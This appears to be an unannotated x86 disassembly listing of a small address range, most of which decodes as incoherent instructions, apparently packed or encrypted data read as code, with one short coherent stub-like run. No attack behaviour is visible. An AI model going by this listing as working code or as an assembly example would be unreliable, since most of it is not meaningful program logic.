  40424d:	adc    ebx,DWORD PTR [eax]
  40424f:	xor    DWORD PTR [ebx-0x18fcaef6],0xbe26ebaf
  404259:	mov    eax,ds:0xa87df6
  40425e:	dec    ebx
  40425f:	push   eax
  404260:	xlat   BYTE PTR ds:[ebx]
  404261:	outs   dx,BYTE PTR ds:[esi]
  404262:	jp     0x4041e6
  404264:	pusha  
  404265:	scas   al,BYTE PTR es:[edi]
  404266:	push   0xa686a272
  40426b:	scas   eax,DWORD PTR es:[edi]
  40426c:	sahf   
  40426d:	xchg   edx,eax
  40426e:	sub    al,0x25
  404270:	mov    ds,WORD PTR ds:0x9e00c465
  404276:	cmc    
  404277:	inc    edx
  404278:	sti    
  404279:	jns    0x404229
  40427b:	shl    BYTE PTR [eax],1
  40427d:	daa    
  40427e:	xchg   esi,eax
  40427f:	adc    BYTE PTR [esp+esi*8+0x1f805168],dh
  404286:	cmp    al,0xcf
  404288:	int3   
  404289:	inc    ebp
  40428a:	pop    ecx
  40428b:	push   0x9
  40428d:	pmullw mm2,QWORD PTR [edx-0x4d]
  404291:	xor    DWORD PTR gs:[ebp-0x7451ccf5],esi
  404298:	mov    ah,BYTE PTR [edx]
  40429a:	icebp  
  40429b:	adc    esi,DWORD PTR [ebp+0x53]
  40429e:	in     eax,dx
  40429f:	stos   DWORD PTR es:[edi],eax
  4042a0:	loop   0x404287
  4042a2:	pop    es
  4042a3:	mov    BYTE PTR [ecx],bh
  4042a5:	mov    edx,0x127b0861
  4042aa:	or     eax,0x1bbf8729
  4042af:	das    
  4042b0:	dec    ebp
  4042b1:	dec    ebp
  4042b2:	cmp    ah,BYTE PTR [edx-0x7cdbc85e]
  4042b8:	leave  
  4042b9:	and    eax,DWORD PTR [ebx+eiz*4-0x20]
  4042bd:	pop    eax
  4042be:	out    dx,eax
  4042bf:	lea    eax,[edi]
  4042c1:	test   al,0x4a
  4042c3:	imul   ecx,DWORD PTR [esp+ecx*2+0x3b125425],0xffffffdd
  4042cb:	mov    eax,ds:0xb5436875
  4042d0:	jge    0x40431d
  4042d2:	push   ebx
  4042d3:	pop    edi
  4042d4:	xor    cl,ch
  4042d6:	push   cs
  4042d7:	mov    eax,0xab44f36a
  4042dc:	inc    ebx
  4042dd:	aam    0x20
  4042df:	xchg   BYTE PTR [ebp-0x2a6cd40b],ah
  4042e5:	xor    eax,0xa16cfb8
  4042ea:	mov    bl,0xc9
  4042ec:	mov    ds:0x272bbb32,al
  4042f1:	mov    esi,0x1c7ffbf5
  4042f6:	xor    ah,BYTE PTR [ebp-0x14]
  4042f9:	push   esp
  4042fa:	xlat   BYTE PTR ds:[ebx]
  4042fb:	mov    edx,0x69953f62
  404300:	push   0xfffffffa
  404302:	xchg   edi,eax
  404303:	(bad)
  404306:	cmp    eax,DWORD PTR [edi]
  404308:	repnz jmp 0x5e06:0x4787f2b5
  404310:	mov    ah,BYTE PTR [edi+esi*1]
  404313:	iret   
  404314:	jo     0x4042d1
  404316:	stos   DWORD PTR es:[edi],eax
  404317:	pusha  
  404318:	push   0x35409392
  40431d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431e:	inc    ebp
  40431f:	shl    DWORD PTR [ebx+0x7351a9ec],cl
  404325:	pushf  
  404326:	scas   al,BYTE PTR es:[edi]
  404327:	or     al,BYTE PTR [esi]
  404329:	sar    DWORD PTR [ecx-0x7c],1
  40432c:	sub    dh,ah
  40432e:	bound  esp,QWORD PTR [ebx+0x25]
  404331:	aad    0x29
  404333:	push   edi
  404334:	popa   
  404335:	xor    al,0xec
  404337:	loopne 0x404316
  404339:	mov    bl,0xb5
  40433b:	push   ebp
  40433c:	imul   esp,DWORD PTR [eax-0x30],0xfffffffd
  404340:	push   es
  404341:	repnz mov bl,ah
  404344:	popf   
  404345:	xchg   ebp,eax
  404346:	loope  0x40438a
  404348:	jnp    0x404378
  40434a:	mov    ebx,0x4e2964
  40434f:	stos   DWORD PTR es:[edi],eax
  404350:	pop    ss
  404351:	xchg   bl,cl
  404353:	imul   ebx,DWORD PTR [eax-0x43582ae3],0x173003bd
  40435d:	dec    edx
  40435e:	scas   eax,DWORD PTR es:[edi]
  40435f:	pusha  
  404360:	imul   esp,ebx,0xffffffe2
  404363:	(bad)  
  404365:	call   0xc1447ff3
  40436a:	icebp  
  40436b:	lds    eax,FWORD PTR [edi+0x62]
  40436e:	cmp    al,0xc4
  404370:	dec    esp
  404371:	xchg   BYTE PTR [ecx-0x69],bl
  404374:	sbb    ah,bh
  404376:	(bad)  
  404377:	add    eax,0x8db2021
  40437c:	ror    dh,1
  40437e:	mov    cl,0x26
  404380:	add    al,ch
  404382:	jl     0x404330
  404384:	push   ecx
  404385:	sbb    eax,0xc662f074
  40438a:	stos   BYTE PTR es:[edi],al
  40438b:	loope  0x4043d5
  40438d:	push   0xfffffff7
  40438f:	and    ah,BYTE PTR [eax+0x359dca34]
  404395:	inc    eax
  404396:	cmp    WORD PTR [esi-0x66],si
  40439a:	jg     0x40434d
  40439c:	add    DWORD PTR [esi],ebx
  40439e:	ds (bad) 
  4043a0:	mov    al,ds:0x1d7af831
  4043a5:	shl    dl,0x95
  4043a8:	xor    BYTE PTR cs:[edx+0x12],0xdd
  4043ad:	pop    ebx
  4043ae:	cmc    
  4043af:	jnp    0x4043a2
  4043b1:	cmp    dh,BYTE PTR [ecx-0x69]
  4043b4:	xlat   BYTE PTR ds:[ebx]
  4043b5:	call   DWORD PTR [edi-0x11]
  4043b8:	aad    0x64
  4043ba:	jge    0x4043db
  4043bc:	xchg   ebp,eax
  4043bd:	jb     0x4043f2
  4043bf:	cmp    ebp,DWORD PTR [edx+edi*2+0x79]
  4043c3:	mov    bl,0x69
  4043c5:	adc    BYTE PTR [esi],dl
  4043c7:	jne    0x4043ba
  4043c9:	cs (bad) 
  4043cb:	adc    eax,0xa70e017f
  4043d0:	clc    
  4043d1:	fbld   TBYTE PTR [ebx+ebp*1-0x58]
  4043d5:	mov    ebx,0x3f12e34e
  4043da:	ja     0x404424
  4043dc:	inc    esp
  4043dd:	add    ch,bh
  4043df:	les    esi,FWORD PTR [ecx]
  4043e1:	js     0x40437b
  4043e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e4:	pop    ebp
  4043e5:	push   ebx
  4043e6:	cmp    BYTE PTR [edi-0x7d099f3],cl
  4043ec:	xchg   ebx,eax
  4043ed:	dec    ebx
  4043ee:	hlt    
  4043ef:	xchg   ecx,eax
  4043f0:	mov    ebx,0x864b8507
  4043f5:	jp     0x404423
  4043f7:	add    eax,0x5103b8
  4043fc:	ret    
  4043fd:	inc    ecx
  4043fe:	sbb    ebp,esp
  404400:	dec    ecx
  404401:	div    cl
  404403:	dec    eax
  404404:	add    edx,edi
  404406:	int3   
  404407:	popf   
  404408:	test   eax,0xdcf3fbbe
  40440d:	fnstcw WORD PTR [ebp-0x80]
  404410:	inc    esp
  404411:	aaa    
  404412:	enter  0x1747,0xc9
  404416:	repz jmp 0xb039:0x4039deb7
  40441e:	(bad)  
  40441f:	pop    esi
  404420:	or     bl,BYTE PTR [ebx+0xc14d348]
  404426:	es aaa 
  404428:	dec    ebp
  404429:	je     0x4043b6
  40442b:	stos   DWORD PTR es:[edi],eax
  40442c:	stos   DWORD PTR es:[edi],eax
  40442d:	inc    ebx
  40442e:	and    al,0x86
  404430:	mov    cs,WORD PTR [eax]
  404432:	jp     0x4043fd
  404434:	arpl   dx,ax
  404436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404437:	ficomp WORD PTR [esi]
  404439:	fsub   QWORD PTR [edi+0x5f]
  40443c:	add    al,0x5f
  40443e:	jmp    0xc7432b5f
  404443:	fld    TBYTE PTR [eax-0x77730a5d]
  404449:	int3   
  40444a:	dec    ecx
  40444b:	imul   al
  40444d:	out    0x45,al
  40444f:	jb     0x4044ae
  404451:	xlat   BYTE PTR ds:[ebx]
  404452:	push   ebp
  404453:	push   esp
  404454:	int    0x97
  404456:	jl     0x404416
  404458:	fs mov esp,0x7b270c7a
  40445e:	and    al,0x7b
  404460:	adc    al,0xdd
  404462:	arpl   WORD PTR [edx+0x7],sp
  404465:	aaa    
  404466:	mov    cl,0x32
  404468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404469:	sub    bh,BYTE PTR [eax]
  40446b:	or     esi,edi
  40446d:	out    dx,al
  40446e:	sahf   
  40446f:	popa   
  404470:	cmp    BYTE PTR [edx],dh
  404472:	pop    ebp
  404473:	sub    cl,BYTE PTR ds:0xe222afb
  404479:	loopne 0x404478
  40447b:	bound  esi,QWORD PTR [ebx]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044f3
  404490:	push   ebp
  404491:	in     eax,dx
  404492:	push   esi
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404479
  40449c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40449d:	jae    0x4044e7
  40449f:	mov    ebx,DWORD PTR [ebx-0x9f41204]
  4044a5:	adc    BYTE PTR [edx],dh
  4044a7:	mov    ebx,0x4462f5b1
  4044ac:	jae    0x404499
  4044ae:	cmc    
  4044af:	mov    esp,0x952cb755
  4044b4:	test   al,0x56
  4044b6:	push   cs
  4044b7:	inc    edx
  4044b8:	adc    cl,BYTE PTR [ebx+edx*4]
  4044bb:	sub    edi,DWORD PTR fs:[edx]
  4044be:	mov    esp,0x8500bafd
  4044c3:	jecxz  0x4044d1
  4044c5:	xor    al,0xaa
  4044c7:	inc    ebp
  4044c8:	or     eax,0x4e1fbd56
  4044cd:	stos   DWORD PTR es:[edi],eax
  4044ce:	aad    0xbf
  4044d0:	pushf  
  4044d1:	leave  
  4044d2:	sbb    eax,0x5e716dfe
  4044d7:	xchg   ebx,eax
  4044d8:	dec    eax
  4044d9:	or     DWORD PTR [edx-0xb82b385],eax
  4044df:	in     al,dx
  4044e0:	xchg   DWORD PTR [ebp+0x3ccd0c4],esi
  4044e6:	arpl   sp,cx
  4044e8:	push   cs
  4044e9:	test   BYTE PTR [edx-0x4e],bh
  4044ec:	(bad)  
  4044ed:	out    0x40,eax
  4044ef:	les    edi,FWORD PTR ds:0x31259697
  4044f5:	cmp    al,BYTE PTR [ebp-0x22866da1]
  4044fb:	mov    al,0x34
  4044fd:	sub    eax,0x461b5552
  404502:	sub    al,0x2e
  404504:	sti    
  404505:	jnp    0x4044a4
  404507:	fs or  al,0xd2
  40450a:	mov    dh,0x12
  40450c:	cmp    ch,BYTE PTR ds:0xb0b0e68
  404512:	xchg   ecx,eax
  404513:	jg     0x404588
  404515:	sahf   
  404516:	call   FWORD PTR [eax]
  404518:	mov    al,0x29
  40451a:	mov    ?,WORD PTR [esi]
  40451c:	pop    ds
  40451d:	add    BYTE PTR [edi],ch
  40451f:	mov    bl,0x54
  404521:	and    DWORD PTR [esi],edx
  404523:	int    0xbd
  404525:	adc    ch,0xc2
  404528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404529:	fcom   DWORD PTR [ebx-0x177a120d]
  40452f:	nop
  404530:	(bad)  
  404531:	js     0x4044ca
  404533:	xor    al,BYTE PTR [ebx+ecx*1+0x26d08f35]
  40453a:	and    eax,0x1e07fe3c
  40453f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404540:	xchg   ebp,eax
  404541:	mov    dl,BYTE PTR [edx+0x9730251]
  404547:	jecxz  0x4044d3
  404549:	cmp    esp,DWORD PTR [ebp+edx*2+0xd]
  40454d:	sbb    ah,BYTE PTR [ebp+0x4c5392a0]
  404553:	push   edx
  404554:	inc    ebx
  404555:	push   cs
  404556:	(bad)  
  404557:	ss xchg edx,eax
  404559:	loope  0x4045ce
  40455b:	add    ch,ch
  40455d:	push   ecx
  40455e:	popa   
  40455f:	mov    ch,0xf8
  404561:	jge    0x4045da
  404563:	(bad)  
  404564:	sbb    al,BYTE PTR [esi-0x64]
  404567:	jmp    0xfd1737df
  40456c:	or     DWORD PTR [esi],eax
  40456e:	mov    bl,0xb9
  404570:	mov    edi,cs
  404572:	shr    BYTE PTR [esi],0xbd
  404575:	clc    
  404576:	fiadd  DWORD PTR [ebx]
  404578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404579:	and    al,0xa8
  40457b:	xor    BYTE PTR [ecx-0x7011d720],0x15
  404582:	enter  0xbef5,0x63
  404586:	(bad)  
  404587:	std    
  404588:	sub    DWORD PTR [ecx-0x3c],eax
  40458b:	sub    DWORD PTR [esi+eax*2],esi
  40458e:	or     al,0x12
  404590:	xchg   BYTE PTR [eax-0x3d],bl
  404593:	jne    0x4045a5
  404595:	push   esi
  404596:	fcmovne st,st(6)
  404598:	mov    cl,0xc
  40459a:	push   esi
  40459b:	or     eax,0xb1578127
  4045a0:	mov    ch,0xd0
  4045a2:	lahf   
  4045a3:	pop    ds
  4045a4:	xor    bh,BYTE PTR [ecx-0x2ba476a4]
  4045aa:	mov    ebx,0x1b0e7e50
  4045af:	in     al,0x40
  4045b1:	ret    0x94ac
  4045b4:	jno    0x4045e8
  4045b6:	mov    bh,bl
  4045b8:	shl    bh,1
  4045ba:	adc    DWORD PTR [esp+ecx*4-0x62],0xffffff8c
  4045bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c0:	fwait
  4045c1:	scas   eax,DWORD PTR es:[edi]
  4045c2:	ins    BYTE PTR es:[edi],dx
  4045c3:	cld    
  4045c4:	sbb    DWORD PTR [ebx+0x36],0x1b
  4045c8:	sub    DWORD PTR [ebp+0xe88728f],0xd34a9ee6
  4045d2:	fdiv   st,st(7)
  4045d4:	aaa    
  4045d5:	jmp    0xc361:0x2717e474
  4045dc:	hlt    
  4045dd:	pop    esp
  4045de:	sahf   
  4045df:	cmp    DWORD PTR [ecx-0x2c],ebx
  4045e2:	inc    edi
  4045e3:	popa   
  4045e4:	mov    ch,0x41
  4045e6:	push   esp
  4045e7:	aas    
  4045e8:	dec    esp
  4045e9:	in     al,dx
  4045ea:	sub    BYTE PTR [ebp-0x61],bh
  4045ed:	pop    es
  4045ee:	clc    
  4045ef:	xor    al,0x5f
  4045f1:	test   DWORD PTR [edi-0x5b],esi
  4045f4:	and    al,0xe9
  4045f6:	pop    ss
  4045f7:	retf   
  4045f8:	sub    ecx,ebp
  4045fa:	adc    edx,DWORD PTR [edi-0x68]
  4045fd:	sbb    DWORD PTR [ebp+ecx*1-0x19],ecx
  404601:	loopne 0x404660
  404603:	cmc    
  404604:	xor    ebp,edx
  404606:	cmc    
  404607:	neg    DWORD PTR [edi-0x13]
  40460a:	inc    esi
  40460b:	jge    0x404621
  40460d:	or     al,0x37
  40460f:	jmp    0x404670
  404611:	add    ebp,DWORD PTR [esi]
  404613:	xor    DWORD PTR [edi],0xffffffee
  404616:	sbb    ch,BYTE PTR [eax+0x50]
  404619:	pop    edx
  40461a:	loope  0x40462f
  40461c:	out    dx,eax
  40461d:	xchg   sp,ax
  40461f:	stos   DWORD PTR es:[edi],eax
  404620:	gs jge 0x4046a1
  404623:	push   edi
  404624:	mov    dh,0xfa
  404626:	push   esp
  404627:	and    ebx,DWORD PTR [edx-0x49]
  40462a:	adc    eax,0x38bbcda9
  40462f:	xchg   edx,eax
  404630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404631:	pop    ebp
  404632:	ja     0x40465b
  404634:	lock je 0x404602
  404637:	(bad)  
  404638:	sub    dl,al
  40463a:	fistp  QWORD PTR [edx+edi*4-0x217d301]
  404641:	sub    ch,BYTE PTR [ebx-0x71]
  404644:	addr16 call 0xb812baa9
  40464a:	jmp    0xec1f0f1c
  40464f:	sub    DWORD PTR [edx-0x20],ecx
  404652:	mov    al,0xc2
  404654:	mov    ecx,DWORD PTR [edx-0x3c]
  404657:	pop    ds
  404658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404659:	cmp    eax,0xe09182de
  40465e:	pop    esi
  40465f:	sub    al,0x16
  404661:	push   ss
  404662:	fnstenv [eax-0x74]
  404665:	mov    ecx,eax
  404667:	dec    esp
  404668:	push   edx
  404669:	int    0xaa
  40466b:	aas    
  40466c:	sub    esi,DWORD PTR es:[edx+edx*1]
  404670:	and    ch,dh
  404672:	leave  
  404673:	and    al,0x2d
  404675:	das    
  404676:	pop    ds
  404677:	enter  0x1cf4,0x54
  40467b:	cmp    DWORD PTR [esi+0x38b5c05e],edx
  404681:	imul   esp,eax,0x75
  404684:	cmp    eax,DWORD PTR [ebp-0x39]
  404687:	int3   
  404688:	mov    dl,0xa6
  40468a:	adc    edx,DWORD PTR [edx]
  40468c:	div    DWORD PTR [ebx+0x64]
  40468f:	sbb    eax,0xa96cfe8
  404694:	push   es
  404695:	test   BYTE PTR [ebp-0x71],bl
  404698:	daa    
  404699:	(bad)  
  40469a:	(bad)  
  40469b:	pop    ds
  40469c:	pop    ebx
  40469d:	test   DWORD PTR [esi],0x1d1336b7
  4046a3:	push   0x3f7a5cbe
  4046a8:	jmp    0x955025f7
  4046ad:	outs   dx,DWORD PTR ds:[esi]
  4046ae:	pop    es
  4046af:	adc    esp,DWORD PTR [ebp+ecx*8-0x5e]
  4046b3:	pop    es
  4046b4:	jmp    0x404735
  4046b6:	and    al,0xb9
  4046b8:	sub    DWORD PTR [ecx-0x4c],0xffffffba
  4046bc:	xchg   esi,eax
  4046bd:	icebp  
  4046be:	jns    0x4046b2
  4046c0:	ja     0x404673
  4046c2:	fs pushf 
  4046c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c5:	ret    0x14ea
  4046c8:	xor    eax,0x519e0806
  4046cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ce:	push   ebx
  4046cf:	jae    0x4046b2
  4046d1:	mov    WORD PTR [ecx+0x7f],?
  4046d4:	add    cl,cl
  4046d6:	test   BYTE PTR [esi-0x465e370a],dh
  4046dc:	loope  0x4046a1
  4046de:	ror    DWORD PTR [ebx+0x3c],1
  4046e1:	loop   0x404742
  4046e3:	loope  0x40472e
  4046e5:	jg     0x4046ab
  4046e7:	inc    edi
  4046e8:	mov    bl,0x86
  4046ea:	mov    eax,ds:0x39abaf5b
  4046ef:	mov    ds:0x5172869d,al
  4046f4:	jmp    0x404733
  4046f6:	jbe    0x404696
  4046f8:	fstp   TBYTE PTR ds:0x2e25f731
  4046fe:	mov    BYTE PTR [ebp+0x17],al
  404701:	cwde   
  404702:	les    ebp,FWORD PTR [edi+0x32]
  404705:	dec    ebx
  404706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404707:	fstp   DWORD PTR [esi+0x5d5023fc]
  40470d:	gs loopne 0x4046de
  404710:	sub    esi,DWORD PTR [ecx-0x76c16dd2]
  404716:	dec    esi
  404717:	or     eax,0x5560c2df
  40471c:	in     eax,dx
  40471d:	mov    bl,0x14
  40471f:	mov    esi,0xa5023f21
  404724:	adc    esi,DWORD PTR [ebx]
  404726:	add    al,0xcb
  404728:	das    
  404729:	sub    BYTE PTR [ebp-0x2e],0x9a
  40472d:	icebp  
  40472e:	adc    edi,esp
  404730:	retf   0x82f7
  404733:	xchg   BYTE PTR [edx+0x4a136dda],al
  404739:	mov    bh,0x21
  40473b:	lahf   
  40473c:	push   ebp
  40473d:	mov    edx,0x80fc757f
  404742:	(bad)  
  404743:	out    dx,eax
  404744:	(bad)  
  404746:	test   BYTE PTR [esp+eiz*2+0x41177ccc],ah
  40474d:	pop    ebp
  40474e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40474f:	jb     0x404760
  404751:	inc    eax
  404752:	add    ebx,ecx
  404754:	in     al,0x86
  404756:	push   cs
  404757:	xlat   BYTE PTR ds:[ebx]
  404758:	sub    DWORD PTR [ebx-0x689b94ce],ebp
  40475e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40475f:	jo     0x40476b
  404761:	jb     0x404703
  404763:	and    ebx,DWORD PTR [edx]
  404765:	adc    esp,eax
  404767:	xor    al,0x26
  404769:	imul   ebp,DWORD PTR [edi],0xaf2a3c1f
  40476f:	xor    eax,0xc9843b51
  404774:	sub    dl,BYTE PTR [edx-0x5553e0ee]
  40477a:	inc    edi
  40477b:	and    ecx,DWORD PTR [edi+edx*1+0x33de55d0]
  404782:	rol    BYTE PTR [ebx],1
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	mov    al,ds:0xb86cf0e6
  4047b9:	daa    
  4047ba:	jle    0x40483a
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404782
  4047c1:	fnstcw WORD PTR [edi+edi*4]
  4047c4:	sub    al,0xd3
  4047c6:	popf   
  4047c7:	push   esp
  4047c8:	loope  0x4047fb
  4047ca:	pop    ss
  4047cb:	cmp    ecx,DWORD PTR [esi-0x1]
  4047ce:	out    0x9e,al
  4047d0:	rol    BYTE PTR [edx],cl
  4047d2:	jmp    0xc262db4c
  4047d7:	inc    esi
  4047d8:	xchg   esi,edx
  4047da:	hlt    
  4047db:	call   0x3edac52
  4047e0:	xor    al,0x7
  4047e2:	and    BYTE PTR [edi+0x2b],bl
  4047e5:	mov    ecx,0xaad5f0a8
  4047ea:	daa    
  4047eb:	scas   eax,DWORD PTR es:[edi]
  4047ec:	bound  ebp,QWORD PTR [ecx-0x46]
  4047ef:	pop    esi
  4047f0:	call   0x4925ea85
  4047f5:	and    DWORD PTR [ecx+0x342a9c73],0x48bf9c2e
  4047ff:	dec    ecx
  404800:	or     eax,0xbaf61146
  404805:	or     eax,0xce7d8400
  40480a:	inc    esp
  40480b:	xor    eax,0x7cee117e
  404810:	ins    BYTE PTR es:[edi],dx
  404811:	xchg   edx,eax
  404812:	sbb    eax,0xb9c08472
  404817:	mov    ah,0xca
  404819:	enter  0x3911,0x4d
  40481d:	inc    ebp
  40481e:	pop    edx
  40481f:	dec    ecx
  404820:	enter  0xaa83,0x4f
  404824:	call   0x6329:0xd573d2c7
  40482b:	aad    0x72
  40482d:	push   eax
  40482e:	aam    0x60
  404830:	adc    bl,ch
  404832:	xor    dh,BYTE PTR [ebx]
  404834:	mov    ah,0x2c
  404836:	lods   al,BYTE PTR ds:[esi]
  404837:	cmp    al,0x84
  404839:	adc    ebx,DWORD PTR [edx+0x4]
  40483c:	push   ss
  40483d:	fsub   st(3),st
  40483f:	je     0x4047d8
  404841:	or     esp,ebx
  404843:	mov    ds:0x74b3cf15,al
  404848:	mov    ebx,0x35488d8
  40484d:	sahf   
  40484e:	cli    
  40484f:	xor    eax,0x6af6bc0f
  404854:	cmp    al,0xdf
  404856:	out    dx,al
  404857:	jecxz  0x4048be
  404859:	add    eax,ebp
  40485b:	mov    eax,ds:0x6c6585e6
  404860:	in     eax,0xb7
  404862:	lock popf 
  404864:	pop    DWORD PTR [eax-0x2d]
  404867:	jmp    0x404881
  404869:	mov    bl,0x9e
  40486b:	mov    cl,0x67
  40486d:	mov    dl,0x26
  40486f:	stc    
  404870:	fcmovne st,st(7)
  404872:	dec    ebp
  404873:	and    dh,cl
  404875:	(bad)  
  404876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404877:	xchg   esp,eax
  404878:	jle    0x404853
  40487a:	inc    edi
  40487b:	xor    eax,0xf740c954
  404880:	cmp    ebp,esi
  404882:	fnstenv [ebx]
  404884:	cmp    DWORD PTR [esi-0x34],ecx
  404887:	addr16 leave 
  404889:	pop    edi
  40488a:	(bad)  
  40488b:	sahf   
  40488c:	mov    ch,BYTE PTR [ecx-0x26]
  40488f:	mov    dl,0xfa
  404891:	cld    
  404892:	cmp    al,0xa1
  404894:	sahf   
  404895:	(bad)  
  404896:	out    dx,eax
  404897:	mov    al,BYTE PTR [eax-0x41]
  40489a:	add    edi,ebx
  40489c:	imul   ecx,ebx,0xd2431d02
  4048a2:	or     BYTE PTR [eax-0x5b],0x39
  4048a6:	jmp    DWORD PTR [edi-0x3deafaaf]
  4048ac:	retfw  0xcca5
  4048b0:	adc    DWORD PTR [esi],esp
  4048b2:	stos   BYTE PTR es:[edi],al
  4048b3:	fucomi st,st(6)
  4048b5:	xchg   edx,eax
  4048b6:	push   esp
  4048b7:	imul   DWORD PTR [esp+0x11]
  4048bb:	xor    eax,0xa4cd7a93
  4048c0:	jp     0x40486c
  4048c2:	jno    0x4048a8
  4048c4:	xchg   esp,eax
  4048c5:	fwait
  4048c6:	std    
  4048c7:	(bad)  
  4048c8:	out    0x15,al
  4048ca:	mov    al,0xc3
  4048cc:	and    esi,DWORD PTR [edi]
  4048ce:	jmp    0x622b:0x76737ee7
  4048d5:	syscall 
  4048d7:	daa    
  4048d8:	push   ecx
  4048d9:	inc    esi
  4048da:	rol    DWORD PTR [esi+0x7745d5d1],0x8a
  4048e1:	mov    esp,0x1557a467
  4048e6:	icebp  
  4048e7:	leave  
  4048e8:	jecxz  0x40486e
  4048ea:	inc    eax
  4048eb:	daa    
  4048ec:	push   es
  4048ed:	xor    BYTE PTR [ecx],ch
  4048ef:	imul   ebx,DWORD PTR [edx],0xffffffc3
  4048f2:	fs ins BYTE PTR es:[edi],dx
  4048f4:	add    edi,edi
  4048f6:	fdiv   QWORD PTR [ecx+0x628732d1]
  4048fc:	fiadd  DWORD PTR [edi]
  4048fe:	push   esi
  4048ff:	and    esi,DWORD PTR [ebx+0x592f14b8]
  404905:	xchg   esi,eax
  404906:	sahf   
  404907:	shr    BYTE PTR [ebx+0x4611287f],1
  40490d:	mov    esi,0xbf0fe269
  404912:	or     cl,BYTE PTR [esi+0x3387853b]
  404918:	or     edi,DWORD PTR [edi+0x46]
  40491b:	scas   eax,DWORD PTR es:[edi]
  40491c:	push   ds
  40491d:	test   BYTE PTR [eax],cl
  40491f:	mov    ch,0xd6
  404921:	xor    eax,0x62048049
  404926:	mov    al,ds:0x1c128865
  40492b:	push   ebx
  40492c:	retf   0x3347
  40492f:	xlat   BYTE PTR ds:[ebx]
  404930:	and    al,0xd7
  404932:	sar    BYTE PTR [edx-0x21],1
  404935:	sti    
  404936:	push   esi
  404937:	loop   0x4048f3
  404939:	xchg   ch,ah
  40493b:	push   es
  40493c:	in     al,dx
  40493d:	jmp    0x91f5:0xc5aab65e
  404944:	stos   BYTE PTR es:[edi],al
  404945:	sar    BYTE PTR [esp+ebx*8+0x3b],cl
  404949:	jmp    0x4048d7
  40494b:	and    DWORD PTR [edi],ecx
  40494d:	idiv   cl
  40494f:	mov    ds:0xc02c8ded,eax
  404954:	sub    ebp,DWORD PTR [ecx]
  404956:	or     al,0x7c
  404958:	test   eax,0x9c8f84d1
  40495d:	dec    esp
  40495e:	sbb    eax,0xe886db9b
  404963:	sahf   
  404964:	imul   ebx,DWORD PTR [esi+0x6b],0xd2e24e5a
  40496b:	inc    ebp
  40496c:	mov    al,0x95
  40496f:	nop
  404970:	cmp    eax,0xa864e917
  404975:	cld    
  404976:	jmp    0x4049e0
  404978:	mov    ds:0xc071e77a,eax
  40497d:	fcomp  QWORD PTR [edx+0xa]
  404980:	mov    fs,WORD PTR [ebx]
  404982:	(bad)
  404985:	dec    ebp
  404986:	push   edx
  404987:	sahf   
  404988:	test   eax,0x1b69cd24
  40498d:	sub    ecx,DWORD PTR [ecx+0x137fa5ff]
  404993:	sub    eax,0x30f20e6f
  404998:	popa   
  404999:	push   ds
  40499a:	push   ss
  40499b:	mov    ebp,0x102e3bd7
  4049a0:	mov    WORD PTR [edx+0x70],ss
  4049a3:	outs   dx,DWORD PTR ds:[esi]
  4049a4:	ja     0x404970
  4049a6:	cdq    
  4049a7:	push   esp
  4049a8:	scas   al,BYTE PTR es:[edi]
  4049a9:	jns    0x4049aa
  4049ab:	jb     0x404a08
  4049ad:	stc    
  4049ae:	inc    edx
  4049af:	fwait
  4049b0:	in     eax,0xdc
  4049b2:	mov    ah,0x29
  4049b4:	cmp    ah,BYTE PTR [ebx+0x3e]
  4049b7:	cmp    al,0x3b
  4049b9:	fisub  WORD PTR [edi-0x5d]
  4049bc:	call   0x7cc0:0xe67c5a68
  4049c3:	add    al,0x71
  4049c5:	adc    bl,dh
  4049c7:	and    DWORD PTR [eax+0x7c],esp
  4049ca:	out    0xb5,al
  4049cc:	push   edx
  4049cd:	cli    
  4049ce:	aad    0xde
  4049d0:	jnp    0x40496a
  4049d2:	mov    ch,ah
  4049d4:	dec    esp
  4049d5:	jno    0x40495b
  4049d7:	sub    al,bh
  4049d9:	(bad)  
  4049da:	sbb    bl,BYTE PTR [edx]
  4049dc:	iret   
  4049dd:	jmp    0x4049cc
  4049df:	inc    edx
  4049e0:	leave  
  4049e1:	sub    eax,0x7b13883
  4049e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e7:	ret    
  4049e8:	punpcklbw mm6,mm4
  4049eb:	mov    ebx,0x1ade3e10
  4049f0:	xchg   edx,eax
  4049f1:	mov    dl,0x98
  4049f3:	xchg   DWORD PTR [ebx+0xf0b2e84],edi
